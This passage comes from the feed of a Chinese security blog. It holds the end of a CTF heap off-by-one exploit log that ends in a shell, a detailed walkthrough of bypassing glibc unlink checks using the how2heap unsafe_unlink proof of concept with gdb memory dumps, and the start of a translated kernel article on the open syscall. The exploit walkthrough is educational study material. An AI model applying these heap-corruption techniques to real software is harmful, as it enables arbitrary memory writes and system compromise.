class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x26</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to delete: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line"><span class="string">'whoami\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'asan\n'</span></span><br><span class="line">asan</span><br></pre></td></tr></table></figure><h1><span id="reference">Reference</span></h1><ul><li><a href="https://amritabi0s.wordpress.com/2016/06/11/asis-ctf-quals-2016-b00ks-writeup/" target="_blank" rel="external">https://amritabi0s.wordpress.com/2016/06/11/asis-ctf-quals-2016-b00ks-writeup/</a></li><li><a href="https://bbs.pediy.com/thread-225611.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-225611.htm</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/off_by_one/" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/off_by_one/</a></li><li><a href="https://www.jianshu.com/p/3dffbf482602" target="_blank" rel="external">https://www.jianshu.com/p/3dffbf482602</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;heap null byte off-by-one&lt;/p&gt;
&lt;p&gt;分析环境：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux parrot 4.17.0-parrot17-amd64 #1 SMP Parrot 4.17.17-1parrot17 (2018-08-27) x86_6
      
    
    </summary>
    
      <category term="heap" scheme="https://asanzjx.github.io/categories/heap/"/>
    
    
      <category term="CTF" scheme="https://asanzjx.github.io/tags/CTF/"/>
    
      <category term="heap" scheme="https://asanzjx.github.io/tags/heap/"/>
    
      <category term="exp" scheme="https://asanzjx.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>堆利用 unlink 实战详解</title>
    <link href="https://asanzjx.github.io/2018/10/20/unlink_detail/"/>
    <id>https://asanzjx.github.io/2018/10/20/unlink_detail/</id>
    <published>2018-10-20T09:00:00.000Z</published>
    <updated>2018-10-21T03:33:09.185Z</updated>
    
    <content type="html"><![CDATA[<p><strong>堆溢出利用的精髓</strong>就是：用精心构造的数据去溢出下一个 chunk 的 header，改写 chunk header 中的前向指针 (flink) 和后向指针 (blink) ，然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p><p>unlink 利用方式就是在 free 的时候得到任意地址写入任意数据的机会。</p><p>利用条件：</p><ul><li>连续的两个堆内存空间，第一个堆可溢出，覆写第二个堆 header</li><li>free 第二个堆</li></ul><p>本文对 unlink 检查机制及绕过做简单分析，然后实战分析 how2heap 里 unsafe_unlink。</p><h1><span id="unlink-检查机制及绕过">unlink 检查机制及绕过</span></h1><p>unlink 是一个宏。在最初 unlink 实现的时候，其实是没有对双向链表检查的。代码大致如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BK=second-&gt;bk</span><br><span class="line">FD=second-&gt;fd</span><br><span class="line">FD-&gt;bk=BK</span><br><span class="line">BK-&gt;fd=FD</span><br></pre></td></tr></table></figure><p>而以最新的 glibc 2.27 为例，则早已添加了检查机制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line"><span class="meta-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);      \</span><br><span class="line">FD = P-&gt;fd;      \</span><br><span class="line">BK = P-&gt;bk;      \</span><br><span class="line"><span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="line">malloc_printerr (<span class="string">"corrupted double-linked list"</span>);      \</span><br><span class="line"><span class="meta-keyword">else</span> &#123;      \</span><br><span class="line">FD-&gt;bk = BK;      \</span><br><span class="line">BK-&gt;fd = FD;      \</span><br><span class="line"><span class="meta-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="line"><span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   \</span><br><span class="line"><span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="line"><span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line"><span class="meta-keyword">else</span> &#123;      \</span><br><span class="line">FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">&#125;      \</span><br><span class="line">&#125; <span class="meta-keyword">else</span> &#123;      \</span><br><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">&#125;      \</span><br><span class="line">&#125;      \</span><br><span class="line">&#125;      \</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到这里会修正指针，FD-&gt;bk = P,BK-&gt;fd = P</p><p>这样要满足条件的话，就需要预先构造合适的条件来 bypass 这个限制：</p><ul><li>P-&gt;fd-&gt;bk = P</li><li>P-&gt;bk-&gt;fd = P</li></ul><p>这样在 free unlink 后：</p><ul><li>FD-&gt;bk = BK 等价于 P = P-&gt;bk</li><li>BK-&gt;fd = FD 等价于 P = P-&gt;fd</li></ul><h1><span id="unsafe-unlink-构造分析">unsafe unlink 构造分析</span></h1><p>这里以 how2heap 里最新版的 unsafe_unlink.c : <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c</a> 为例，分析 bypass 及 fake 过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) != False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析环境：</p><ul><li>OS:wsl debian 4.4.0 64bits</li><li>gdb + gef</li><li>libc 2.24</li></ul><p>连续申请两个堆后,第一个堆的mem ptr = 0x8403220，第二个堆的 mem ptr = 0x84032b0</p><p>第一个堆地址存储在 chunk0_ptr 中，&amp;chunk0_ptr = 0x8202050</p><p>查看 0x8202038~0x8202050 存储的内容：</p><table><thead><tr><th>Addr</th><th style="text-align:center">Offset</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td>0x8202038</td><td style="text-align:center">0x0</td><td style="text-align:center">0x0</td></tr><tr><td>0x8202040</td><td style="text-align:center">0x8</td><td style="text-align:center">0x8202040</td></tr><tr><td>0x8202048</td><td style="text-align:center">0x10</td><td style="text-align:center">0x0</td></tr><tr><td>0x8202050</td><td style="text-align:center">0x18</td><td style="text-align:center">0x8403220</td></tr></tbody></table><p>查看第一个堆的状态：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump qword <span class="number">0x8403210</span> L5</span><br><span class="line"><span class="number">0x8403210</span>+<span class="number">0000</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403218</span>+<span class="number">0008</span>   │ <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x8403220</span>+<span class="number">0010</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403228</span>+<span class="number">0018</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403230</span>+<span class="number">0020</span>   │ <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>fake chunk 后第一个堆的状态：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump qword <span class="number">0x8403210</span> L8</span><br><span class="line"><span class="number">0x8403210</span>+<span class="number">0000</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403218</span>+<span class="number">0008</span>   │ <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x8403220</span>+<span class="number">0010</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403228</span>+<span class="number">0018</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403230</span>+<span class="number">0020</span>   │ <span class="number">0x0000000008202038</span></span><br><span class="line"><span class="number">0x8403238</span>+<span class="number">0028</span>   │ <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8403240</span>+<span class="number">0030</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403248</span>+<span class="number">0038</span>   │ <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>free 第二个 chunk 后 chunk0_ptr 存储的内容变了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump qword <span class="number">0x8403210</span> L8</span><br><span class="line"><span class="number">0x8403210</span>+<span class="number">0000</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403218</span>+<span class="number">0008</span>   │ <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x8403220</span>+<span class="number">0010</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403228</span>+<span class="number">0018</span>   │ <span class="number">0x0000000000020de1</span></span><br><span class="line"><span class="number">0x8403230</span>+<span class="number">0020</span>   │ <span class="number">0x0000000008202038</span></span><br><span class="line"><span class="number">0x8403238</span>+<span class="number">0028</span>   │ <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8403240</span>+<span class="number">0030</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403248</span>+<span class="number">0038</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line">gef➤  hexdump qword <span class="number">0x8202038</span> L6</span><br><span class="line"><span class="number">0x8202038</span>+<span class="number">0000</span> &lt;data_start+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202040</span>+<span class="number">0008</span> &lt;__dso_handle+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8202048</span>+<span class="number">0010</span> &lt;completed+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202050</span>+<span class="number">0018</span> &lt;chunk0_ptr+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000008202038</span></span><br><span class="line"><span class="number">0x8202058</span>+<span class="number">0020</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202060</span>+<span class="number">0028</span>   │ <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>即满足条件绕过 unlink 链表 check 。</p><h1><span id="unsafe-unlink-实现任意地址写数据分析">unsafe unlink 实现任意地址写数据分析</span></h1><p>基于以上的分析，此时 chunk0_ptr 存储的是 0x8202038 这个地址，也就是说此时第一个堆的 mem ptr 不再是 0x8403220，而是 0x8202038</p><p>现在向第一个堆写入数据，其实就是往 0x8202038 这个地址写入数据，但是如果可以换掉这个地址，那么就可以往任意地址写任意数据了。效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; n</span><br><span class="line"><span class="comment">//chunk0_ptr[3] = (uint64_t) victim_string;</span></span><br><span class="line"><span class="comment">//chunk0_ptr is now pointing where we want, we use it to overwrite our victim string</span></span><br><span class="line">gef&gt; hexdump qword <span class="number">0x8202038</span> L10</span><br><span class="line"><span class="number">0x8202038</span>+<span class="number">0000</span> &lt;data_start+<span class="number">0000</span>&gt; | <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202040</span>+<span class="number">0008</span> &lt;__dso_handle+<span class="number">0000</span>&gt; | <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8202048</span>+<span class="number">0010</span> &lt;completed+<span class="number">0000</span>&gt; | <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202050</span>+<span class="number">0018</span> &lt;chunk0_ptr+<span class="number">0000</span>&gt; | <span class="number">0x00007ffffffee200</span></span><br><span class="line"><span class="number">0x8202058</span>+<span class="number">0020</span> | <span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">gef&gt; n</span><br><span class="line">Original value: Hello!~</span><br><span class="line">New Value: BBBBAAAA2@</span><br></pre></td></tr></table></figure><h1><span id="reference">Reference：</span></h1><ul><li><a href="http://drops.xmd5.com/static/drops/tips-7326.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-7326.html</a></li><li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;堆溢出利用的精髓&lt;/strong&gt;就是：用精心构造的数据去溢出下一个 chunk 的 header，改写 chunk header 中的前向指针 (flink) 和后向指针 (blink) ，然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任
      
    
    </summary>
    
      <category term="heap" scheme="https://asanzjx.github.io/categories/heap/"/>
    
    
      <category term="heap" scheme="https://asanzjx.github.io/tags/heap/"/>
    
      <category term="exp" scheme="https://asanzjx.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>译 - open 系统调用的实现</title>
    <link href="https://asanzjx.github.io/2018/10/20/%5BTranslation%5Dhow-open-syscall-implement/"/>
    <id>https://asanzjx.github.io/2018/10/20/[Translation]how-open-syscall-implement/</id>
    <published>2018-10-20T08:50:00.000Z</published>
    <updated>2018-10-20T10:23:09.799Z</updated>
    
    <content type="html"><![CDATA[<p>最近参与了一个开源项目，Linux 内核揭秘：<a href="https://github.com/MintCN/linux-insides-zh" target="_blank" rel="external">https://github.com/MintCN/linux-insides-zh</a>。本文是其中的一篇关于 open 系统调用的实现的翻译。</p><h2><span id="open-系统调用实现"><code>open</code> 系统调用实现</span></h2><h2><span id="导论">导论</span></h2><p>本节是详述 Linux 内核中的 <a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="external">系统调用</a> 机制章节的第五部分。之前的内容部分概述了这个机制，现在我将试着详细讲解 Linux 内核中不同系统调用的实现。本章之前的部分和本书其他章节描述的 Linux 内核机制大部分对用户空间是隐约可见或完全不可见。但是 Linux 内核代码不仅仅是有关内核的。大量的内核代码为我们的应用代码提供了支持。通过 Linux 内核，我们的程序可以在不知道 sector,tracks 和磁盘的其他结构的情况下对文件进行读写操作，我们也不需要手动去构造和封装网络数据包就可以通过网络发送数据。</p><p>你觉得怎么样，我认为这非常有趣耶，操作系统如何工作，我们的软件如何与（系统）交互呢。你或许了解，我们的程序通过特定的机制和内核进行交互，这个机制就是<a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="external">系统调用</a>。因此，我决定去写一些系统调用的实现及其行为，比如我们每天会用到的 <code>read</code>,<code>write</code>,<code>open</code>,<code>close</code>,<code>dup</code> 等等。</p><p>我决定从 <code>open</code> 系统调用开始。如果你对 C 程序有了解，你应该知道在我们能对一个文件进行读写或执行其他操作前，我们需要使用 <code>open</code> 函数打开这个文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"test"</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fd &lt; <span class="number">0</span> &#123;</span><br><span class="line">                perror(<span class="string">"Opening of the file is failed\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"file sucessfully opened\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd); </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这样的情况下，<code>open</code> 仅是来自标准库中的函数，而不是系统调用。标准库将为我们调用相关的系统调用。<code>open</code> 调用将返回一个 <a href="https://en.wikipedia.org/wiki/File_descriptor" target="_blank" rel="external">文件描述符</a>。这个文件描述符仅是一个独一无二的数值，在我们的程序里和被打开的文件息息相关。现在我们使用 <code>open</code> 调用打开了一个文件并且得到了文件描述符，我们可以和这个文件开始交互了。我们可以写入，读取等等操作。程序中已打开的文件列表可通过 <a href="https://en.wikipedia.org/wiki/Procfs" target="_blank" rel="external">proc</a> 文件系统获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ls /proc/1/fd/</span><br><span class="line"></span><br><span class="line">0  10  12  14  16  2   21  23  25  27  29  30  32  34  36  38  4   41  43  45  47  49  50  53  55  58  6   61  63  67  8</span><br><span class="line">1  11  13  15  19  20  22  24  26  28  3   31  33  35  37  39  40  42  44  46  48  5   51  54  57  59  60  62  65  7   9</span><br></pre></td></tr></table></figure><p>我并不打算在这篇文章中以用户空间的视角来描述更多 <code>open</code> 例程细节，会更多地从内核的角度来分析。如果你不是很熟悉 <code>open</code> 函数，你可以在 <a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">man 手册</a>获取更多信息。</p><p>开始吧！</p><h2><span id="open-系统调用的定义"><code>open</code> 系统调用的定义</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 